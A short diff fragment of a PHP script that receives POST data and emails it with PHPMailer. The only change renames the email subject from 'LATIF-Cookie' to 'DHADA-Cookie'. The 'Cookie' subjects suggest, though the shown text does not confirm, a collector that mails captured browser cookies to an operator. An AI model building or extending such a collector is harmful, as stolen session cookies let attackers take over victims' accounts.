@@ -63,7 +63,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'LATIF-Cookie';
+        $mail->Subject = 'DHADA-Cookie';
         $mail->Body    = $emailBody;
 
         // Send the email
@@ -77,4 +77,5 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
 
 }
+
 
